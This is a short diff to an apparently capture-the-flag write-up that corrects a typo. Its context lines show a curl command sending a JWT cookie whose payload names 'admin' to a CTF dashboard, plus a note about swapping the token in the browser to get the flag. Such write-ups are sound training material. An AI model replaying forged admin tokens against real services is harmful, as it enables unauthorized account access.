@@ -30,4 +30,4 @@ After I used curl to send the token
 curl -k -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTc2MTIyODA5NSwiZXhwIjoxNzYxMjM1Mjk1fQ.ZJUOMnUgQvYVZGB-X8ucKsq86Vf8U4KOTbCUPZ5QiTE" \
   https://host5.metaproblems.com:7606/dashboard
 ~~~
-Another method was to replace the jwt tokwn in the browser and get the flag.
+Another method was to replace the jwt token in the browser and get the flag.
